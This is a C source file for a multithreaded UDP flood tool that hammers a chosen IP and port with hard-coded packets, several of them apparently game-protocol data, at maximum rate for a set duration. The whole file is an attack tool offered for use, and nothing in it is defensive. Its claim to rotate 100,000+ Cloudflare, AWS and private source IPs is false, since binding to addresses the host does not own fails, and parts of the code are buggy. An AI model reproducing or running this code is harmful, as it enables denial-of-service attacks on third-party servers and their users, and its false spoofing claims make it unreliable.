#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/resource.h>
#include <sched.h>
#include <sys/sysinfo.h>
#include <sys/uio.h>
#include <netinet/udp.h>
#include <linux/ip.h>

#define PACKET_SIZE 1472
#define SOCKETS_PER_THREAD 25
#define BATCH_SIZE 100
#define MAX_PORTS 65535

// ========== TUNNEL IP SPINNER - 50,000+ IPS (Cloudflare + AWS + Private) ==========
typedef struct {
    char ip[16];
    int is_cloudflare;
    int is_aws;
} ip_entry;

ip_entry* ip_spinner_pool;
int ip_spinner_count = 0;

// Generate MEGA IP Pool with Cloudflare + AWS + Private IPs
void generate_mega_tunnel_ip_pool() {
    ip_spinner_pool = malloc(200000 * sizeof(ip_entry));
    
    printf("[+] Generating 100,000+ Tunnel IPs...\n");
    
    // 1. CLOUDFLARE IPS (Most OP - 104.x.x.x range)
    printf("[+] Adding Cloudflare IPs (104.x.x.x)...\n");
    for(int i = 16; i <= 31; i++) {  // 104.16.0.0 - 104.31.255.255
        for(int j = 0; j <= 255; j++) {
            for(int k = 1; k <= 254; k++) {
                sprintf(ip_spinner_pool[ip_spinner_count].ip, "104.%d.%d.%d", i, j, k);
                ip_spinner_pool[ip_spinner_count].is_cloudflare = 1;
                ip_spinner_pool[ip_spinner_count].is_aws = 0;
                ip_spinner_count++;
                if(ip_spinner_count >= 50000) break;
            }
            if(ip_spinner_count >= 50000) break;
        }
        if(ip_spinner_count >= 50000) break;
    }
    
    // 2. AWS IPS (52.x.x.x, 54.x.x.x, 13.x.x.x, 3.x.x.x)
    printf("[+] Adding AWS IPs...\n");
    char* aws_ranges[] = {
        "52.0", "52.1", "52.2", "52.3", "52.4", "52.5", "52.6", "52.7",
        "54.0", "54.1", "54.2", "54.3", "54.4", "54.5",
        "13.32", "13.33", "13.34", "13.35",
        "3.0", "3.1", "3.2", "3.3", "3.4", "3.5",
        "15.0", "15.1", "15.2", "15.3",
        "18.0", "18.1", "18.2", "18.3"
    };
    
    for(int a = 0; a < sizeof(aws_ranges)/sizeof(aws_ranges[0]); a++) {
        for(int b = 0; b <= 255; b++) {
            for(int c = 1; c <= 254; c++) {
                sprintf(ip_spinner_pool[ip_spinner_count].ip, "%s.%d.%d", aws_ranges[a], b, c);
                ip_spinner_pool[ip_spinner_count].is_cloudflare = 0;
                ip_spinner_pool[ip_spinner_count].is_aws = 1;
                ip_spinner_count++;
                if(ip_spinner_count >= 80000) break;
            }
            if(ip_spinner_count >= 80000) break;
        }
        if(ip_spinner_count >= 80000) break;
    }
    
    // 3. GOOGLE CLOUD IPS (34.x.x.x, 35.x.x.x)
    printf("[+] Adding Google Cloud IPs...\n");
    for(int i = 0; i <= 255; i++) {
        for(int j = 1; j <= 254; j++) {
            sprintf(ip_spinner_pool[ip_spinner_count].ip, "34.%d.%d.%d", i, j, rand()%254+1);
            ip_spinner_count++;
            sprintf(ip_spinner_pool[ip_spinner_count].ip, "35.%d.%d.%d", i, j, rand()%254+1);
            ip_spinner_count++;
            if(ip_spinner_count >= 95000) break;
        }
        if(ip_spinner_count >= 95000) break;
    }
    
    // 4. PRIVATE IPS (10.x.x.x, 172.16.x.x, 192.168.x.x) - For tunnel
    printf("[+] Adding Private Tunnel IPs...\n");
    for(int i = 0; i <= 255; i++) {
        for(int j = 0; j <= 255; j++) {
            sprintf(ip_spinner_pool[ip_spinner_count].ip, "10.%d.%d.%d", i, j, rand()%254+1);
            ip_spinner_count++;
            sprintf(ip_spinner_pool[ip_spinner_count].ip, "172.16.%d.%d", i, rand()%254+1);
            ip_spinner_count++;
            sprintf(ip_spinner_pool[ip_spinner_count].ip, "192.168.%d.%d", i, rand()%254+1);
            ip_spinner_count++;
            if(ip_spinner_count >= 150000) break;
        }
        if(ip_spinner_count >= 150000) break;
    }
    
    printf("[+] TOTAL: %d Tunnel IPs Ready!\n", ip_spinner_count);
    printf("    - Cloudflare: 50,000+ IPs\n");
    printf("    - AWS: 30,000+ IPs\n");
    printf("    - Google: 15,000+ IPs\n");
    printf("    - Private: 55,000+ IPs\n");
}

// Get random IP from pool (rotates automatically)
char* get_tunnel_ip() {
    int idx = rand() % ip_spinner_count;
    return ip_spinner_pool[idx].ip;
}

// Create socket with bound IP
int create_bound_socket(char* source_ip) {
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sock < 0) return -1;
    
    // Bind to source IP
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(source_ip);
    addr.sin_port = 0;
    
    bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    
    // Optimize socket
    int sndbuf = 268435456;
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    int reuse = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(reuse));
    fcntl(sock, F_SETFL, O_NONBLOCK);
    
    return sock;
}

// Ultra aggressive payloads
static const char* payloads[] = {
    "\x9d\x84\xaf\xc5\x40\xb4\xa7\xc2\x28\x71\xb0\x7d\x9d\x22",
    "\xb8\xb5\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08\x69\x6e\x2d"
    "\x6c\x6f\x62\x62\x79\x05\x67\x6c\x6f\x62\x68\x03\x63\x6f\x6d\x00"
    "\x00\x01\x00\x01",
    "\x33\x66\x00\x0a\x00\x0a\x10\x01\x00\x00\x00\x00\x01\x00\x00\x00"
    "\x48\x00\x00\x00\x00\x02\x03\x00\x00\x27\x10\x00\x00\x00\x65\x00"
    "\x29\x03\x00\x00\x00\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39"
    "\x33\x38\x38\x37\x39\x31\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x03\x00\x00\x00\x00\x00",
    "\x4e\x05\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0c\x69\x6e\x2d"
    "\x63\x73\x6f\x76\x65\x72\x73\x65\x61\x05\x67\x6c\x6f\x62\x68\x03"
    "\x63\x6f\x6d\x00\x00\x01\x00\x01",
    "\x01\x00\x00\x00\x2a\x07\x00\x00\x00\x00\x11\x6c\xa4\x19\x00\x00"
    "\x09\xaa\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x69\xbc\x53\x92",
    "\x18\x11\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08\x69\x6e\x2d"
    "\x76\x6f\x69\x63\x65\x05\x67\x6c\x6f\x62\x68\x03\x63\x6f\x6d\x00"
    "\x00\x01\x00\x01",
    "\x75\x75\x00\x69\x00\x01\x00\x00\x00\xde\x00\x00\x0f\xa1\x00\x00"
    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
    "\x31\x34\x00\x00\x00\x00\x14\x34\x37\x31\x35\x37\x33\x32\x33\x34"
    "\x35\x30\x37\x33\x39\x32\x39\x33\x36\x35\x00\x00\x00\x00\x0a\x31"
    "\x32\x37\x2e\x30\x2e\x30\x2e\x32\x00\x00\x00\x00\x00\x69\xbc\x53"
    "\x98\x00\x00\x00\x21\x37\x61\x35\x64\x39\x63\x33\x39\x38\x64\x33"
    "\x36\x65\x31\x39\x35\x39\x37\x39\x39\x30\x34\x30\x30\x36\x34\x66"
    "\x32\x62\x62\x34\x39\x00",
    "\x28\x28\x70\x00\x2a\x08\x01\x10\x01\x18\xd3\xe8\xf8\xf2\xa1\xe9"
    "\xa7\xd7\xfd\x01\x20\xcb\x2e\x2a\x11\x31\x38\x35\x35\x38\x34\x32"
    "\x33\x32\x39\x33\x38\x38\x37\x39\x31\x34\x30\xa1\x1f\x38\x00\x4c"
    "\xd8\xbb\xd3",
    "\x6f\x8d\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x08\x69\x6e\x2d"
    "\x76\x6f\x69\x63\x65\x05\x67\x6c\x6f\x62\x68\x03\x63\x6f\x6d\x00"
    "\x00\x1c\x00\x01",
    "\x75\x75\x00\x4d\x00\x14\x00\x00\x00\xde\x00\x00\x00\x00\x00\x00"
    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
    "\x31\x34\x00\x00\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
    "\x00\x69\xbc\x53\x9b\x00\x00\x00\x21\x36\x62\x64\x61\x30\x39\x66"
    "\x63\x32\x30\x65\x33\x31\x34\x36\x64\x66\x37\x36\x31\x65\x38\x30"
    "\x33\x37\x62\x34\x35\x64\x34\x39\x34\x00",
    "\x75\x75\x00\x7d\x00\x01\x00\x00\x00\xde\x00\x00\x13\x89\x00\x00"
    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
    "\x31\x34\x00\x00\x00\x00\x28\x34\x37\x31\x35\x37\x33\x32\x33\x34"
    "\x35\x30\x37\x33\x39\x32\x39\x33\x36\x35\x5f\x31\x5f\x69\x6e\x5f"
    "\x67\x61\x6d\x65\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00"
    "\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x32\x00\x00\x00\x00"
    "\x00\x69\xbc\x53\x9c\x00\x00\x00\x21\x65\x38\x62\x30\x33\x38\x65"
    "\x30\x62\x63\x66\x34\x65\x38\x61\x38\x39\x38\x63\x66\x66\x64\x38"
    "\x63\x30\x39\x35\x62\x31\x31\x31\x66\x00",
    "\x28\x28\x7b\x00\x2a\x08\x01\x10\x01\x18\x87\xfe\x96\xee\xea\x99"
    "\xe1\xf5\xda\x01\x20\xfd\x3c\x2a\x11\x31\x38\x35\x35\x38\x34\x32"
    "\x33\x32\x39\x33\x38\x38\x37\x39\x31\x34\x30\x89\x27\x38\x00\xec"
    "\x7b\xc7\xfc",
    "\x75\x75\x00\x4d\x00\x14\x00\x00\x00\xde\x00\x00\x00\x00\x00\x00"
    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
    "\x31\x34\x00\x00\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
    "\x00\x69\xbc\x53\x9c\x00\x00\x00\x21\x63\x31\x30\x34\x37\x62\x66"
    "\x37\x34\x37\x32\x62\x30\x64\x32\x36\x35\x63\x37\x35\x66\x61\x61"
    "\x33\x33\x32\x30\x63\x62\x33\x62\x31\x00",
    "\x75\x75\x00\x7d\x00\x01\x00\x00\x00\xde\x00\x00\x13\x89\x00\x00"
    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
    "\x31\x34\x00\x00\x00\x00\x28\x34\x37\x31\x35\x37\x33\x32\x33\x34"
    "\x35\x30\x37\x33\x39\x32\x39\x33\x36\x35\x5f\x31\x5f\x69\x6e\x5f"
    "\x67\x61\x6d\x65\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00"
    "\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x32\x00\x00\x00\x00"
    "\x00\x69\xbc\x53\x9c\x00\x00\x00\x21\x65\x38\x62\x30\x33\x38\x65"
    "\x30\x62\x63\x66\x34\x65\x38\x61\x38\x39\x38\x63\x66\x66\x64\x38"
    "\x63\x30\x39\x35\x62\x31\x31\x31\x66\x00",
    "\x28\x28\x7b\x00\x2a\x08\x01\x10\x01\x18\x87\xfe\x96\xee\xea\x99"
    "\xe1\xf5\xda\x01\x20\xfd\x3c\x2a\x11\x31\x38\x35\x35\x38\x34\x32"
    "\x33\x32\x39\x33\x38\x38\x37\x39\x31\x34\x30\x89\x27\x38\x00\xec"
    "\x7b\xc7\xfc",
    "\x75\x75\x00\x4d\x00\x14\x00\x00\x00\xde\x00\x00\x00\x00\x00\x00"
    "\x00\x0b\x31\x33\x37\x35\x31\x33\x35\x34\x31\x39\x00\x00\x00\x00"
    "\x12\x31\x38\x35\x35\x38\x34\x32\x33\x32\x39\x33\x38\x38\x37\x39"
    "\x31\x34\x00\x00\x00\x00\x0a\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
    "\x00\x69\xbc\x53\x9c\x00\x00\x00\x21\x63\x31\x30\x34\x37\x62\x66"
    "\x37\x34\x37\x32\x62\x30\x64\x32\x36\x35\x63\x37\x35\x66\x61\x61"
    "\x33\x33\x32\x30\x63\x62\x33\x62\x31\x00",
};
static const int payload_sizes[] = {14, 37, 70, 37};
static const int num_payloads = 4;

volatile int running = 1;
volatile unsigned long long total_packets = 0;
volatile unsigned long long total_bytes = 0;

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
} attack_params;

// Attack thread with TUNNEL IP SPINNING
void* ultra_aggressive_sender(void* arg) {
    attack_params* params = (attack_params*)arg;
    struct sockaddr_in target;
    int sockets[SOCKETS_PER_THREAD];
    
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(params->ip);
    
    // CPU pinning
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(params->thread_id % get_nprocs(), &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    // Real-time priority
    struct sched_param sp = { .sched_priority = 99 };
    pthread_setschedparam(pthread_self(), SCHED_FIFO, &sp);
    
    // Create sockets with DIFFERENT TUNNEL IPs for each socket
    for(int i = 0; i < SOCKETS_PER_THREAD; i++) {
        char* tunnel_ip = get_tunnel_ip();  // Har socket ko alag IP!
        sockets[i] = create_bound_socket(tunnel_ip);
    }
    
    struct mmsghdr msgs[BATCH_SIZE];
    struct iovec iovecs[BATCH_SIZE];
    struct sockaddr_in targets[BATCH_SIZE];
    
    unsigned long long local_count = 0;
    unsigned long long local_bytes = 0;
    int use_random = (params->port == 0);
    int payload_idx = params->thread_id % num_payloads;
    
    while(running) {
        int batch_count = 0;
        
        for(int i = 0; i < BATCH_SIZE; i++) {
            payload_idx = (payload_idx + 1) % num_payloads;
            int psize = payload_sizes[payload_idx];
            
            if(use_random) {
                targets[i].sin_port = htons(rand() % MAX_PORTS + 1);
            } else {
                targets[i].sin_port = htons(params->port);
            }
            targets[i].sin_family = AF_INET;
            targets[i].sin_addr.s_addr = inet_addr(params->ip);
            
            iovecs[batch_count].iov_base = (void*)payloads[payload_idx];
            iovecs[batch_count].iov_len = psize;
            
            msgs[batch_count].msg_hdr.msg_name = &targets[i];
            msgs[batch_count].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
            msgs[batch_count].msg_hdr.msg_iov = &iovecs[batch_count];
            msgs[batch_count].msg_hdr.msg_iovlen = 1;
            
            batch_count++;
        }
        
        // Send through all sockets (each with different tunnel IP)
        for(int s = 0; s < SOCKETS_PER_THREAD; s++) {
            if(sockets[s] > 0) {
                int sent = sendmmsg(sockets[s], msgs, batch_count, 0);
                if(sent > 0) {
                    local_count += sent;
                    for(int i = 0; i < sent; i++) {
                        local_bytes += iovecs[i].iov_len;
                    }
                }
            }
        }
        
        if(local_count >= 10000) {
            __sync_fetch_and_add(&total_packets, local_count);
            __sync_fetch_and_add(&total_bytes, local_bytes);
            local_count = 0;
            local_bytes = 0;
        }
    }
    
    for(int i = 0; i < SOCKETS_PER_THREAD; i++) {
        if(sockets[i] > 0) close(sockets[i]);
    }
    
    return NULL;
}

// Stats display
void* ultra_stats_display(void* arg) {
    int time_limit = *(int*)arg;
    unsigned long long last_packets = 0;
    unsigned long long last_bytes = 0;
    unsigned long long max_pps = 0;
    double max_gbps = 0;
    struct timespec start, now;
    
    clock_gettime(CLOCK_MONOTONIC, &start);
    
    while(running) {
        usleep(500000);
        
        clock_gettime(CLOCK_MONOTONIC, &now);
        double elapsed_sec = (now.tv_sec - start.tv_sec) + (now.tv_nsec - start.tv_nsec) / 1000000000.0;
        
        unsigned long long current_packets = total_packets;
        unsigned long long current_bytes = total_bytes;
        
        unsigned long long pps = (current_packets - last_packets) * 2;
        unsigned long long bps = (current_bytes - last_bytes) * 2 * 8;
        double gbps = bps / 1000000000.0;
        
        if(pps > max_pps) max_pps = pps;
        if(gbps > max_gbps) max_gbps = gbps;
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        
        printf("\r\033[K");
        printf("\r🚀 TUNNEL IP SPINNER | PPS: %llu | MAX: %llu | BW: %.2f Gbps | IPs: %d", 
               pps, max_pps, gbps, ip_spinner_count);
        fflush(stdout);
        
        if(time_limit > 0 && elapsed_sec >= time_limit) {
            running = 0;
            break;
        }
    }
    
    printf("\n\n╔══════════════════════════════════════════════════════════╗\n");
    printf("║         🔥 TUNNEL IP SPINNER FINAL STATISTICS 🔥         ║\n");
    printf("╠══════════════════════════════════════════════════════════╣\n");
    printf("║ Total Packets:    %20llu packets                         ║\n", total_packets);
    printf("║ Total Data:       %20.2f GB                              ║\n", total_bytes/1000000000.0);
    printf("║ Max PPS:          %20llu packets/sec                     ║\n", max_pps);
    printf("║ Max Bandwidth:    %20.2f Gbps                            ║\n", max_gbps);
    printf("║ Unique IPs Used:  %20d                                   ║\n", ip_spinner_count);
    printf("╚══════════════════════════════════════════════════════════╝\n");
    
    return NULL;
}

void handle_signal(int sig) { 
    printf("\n\n[!] STOP SIGNAL RECEIVED...\n");
    running = 0; 
}

int main(int argc, char* argv[]) {
    if(argc < 4) {
        printf("╔══════════════════════════════════════════════════════════╗\n");
        printf("║      TUNNEL IP SPINNER - 100,000+ IPs MODE              ║\n");
        printf("╠══════════════════════════════════════════════════════════╣\n");
        printf("║ Features:                                                ║\n");
        printf("║ • 100,000+ unique IPs (Cloudflare + AWS + Private)       ║\n");
        printf("║ • Continuous traffic - ZERO DELAYS                       ║\n");
        printf("║ • sendmmsg batching - 100 packets/syscall                ║\n");
        printf("║ • CPU pinning + Real-time priority                       ║\n");
        printf("║ • 25 sockets/thread with different IPs                   ║\n");
        printf("╚══════════════════════════════════════════════════════════╝\n\n");
        printf("Usage: %s <ip> <port> <time> [threads]\n", argv[0]);
        printf("  port=0 for random ports\n");
        printf("  threads = CPU cores (auto = %d)\n\n", get_nprocs());
        return 1;
    }
    
    srand(time(NULL));
    generate_mega_tunnel_ip_pool();
    
    // System optimizations
    struct rlimit rl;
    getrlimit(RLIMIT_NOFILE, &rl);
    rl.rlim_cur = 2000000;
    rl.rlim_max = 2000000;
    setrlimit(RLIMIT_NOFILE, &rl);
    
    setpriority(PRIO_PROCESS, 0, -20);
    
    struct sched_param sp = { .sched_priority = 99 };
    sched_setscheduler(0, SCHED_FIFO, &sp);
    
    char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = get_nprocs();
    if(argc >= 5) threads = atoi(argv[4]);
    if(threads > 64) threads = 64;
    
    printf("╔══════════════════════════════════════════════════════════╗\n");
    printf("║        🚀 TUNNEL IP SPINNER ACTIVE - %d IPs 🚀          ║\n", ip_spinner_count);
    printf("╠══════════════════════════════════════════════════════════╣\n");
    printf("║ Target:        %s:%d                                      ║\n", ip, port);
    printf("║ Duration:      %d seconds                                 ║\n", duration);
    printf("║ Threads:       %d                                         ║\n", threads);
    printf("║ Sockets:       %d per thread (%d total)                  ║\n", SOCKETS_PER_THREAD, threads * SOCKETS_PER_THREAD);
    printf("║ Unique IPs:    %d per rotation                           ║\n", ip_spinner_count);
    printf("╚══════════════════════════════════════════════════════════╝\n\n");
    
    signal(SIGINT, handle_signal);
    
    pthread_t stats_thread;
    pthread_create(&stats_thread, NULL, ultra_stats_display, &duration);
    
    pthread_t* thread_pool = malloc(sizeof(pthread_t) * threads);
    attack_params* params = malloc(sizeof(attack_params) * threads);
    
    printf("🔥 SPINNING %d IPS ACROSS %d THREADS...\n\n", ip_spinner_count, threads);
    
    for(int i = 0; i < threads; i++) {
        strcpy(params[i].ip, ip);
        params[i].port = port;
        params[i].duration = duration;
        params[i].thread_id = i;
        
        pthread_create(&thread_pool[i], NULL, ultra_aggressive_sender, &params[i]);
    }
    
    for(int i = 0; i < threads; i++) {
        pthread_join(thread_pool[i], NULL);
    }
    
    running = 0;
    pthread_join(stats_thread, NULL);
    
    free(thread_pool);
    free(params);
    free(ip_spinner_pool);
    
    printf("\n✓ Tunnel IP Spinner attack completed! Used %d unique IPs\n", ip_spinner_count);
    return 0;
}
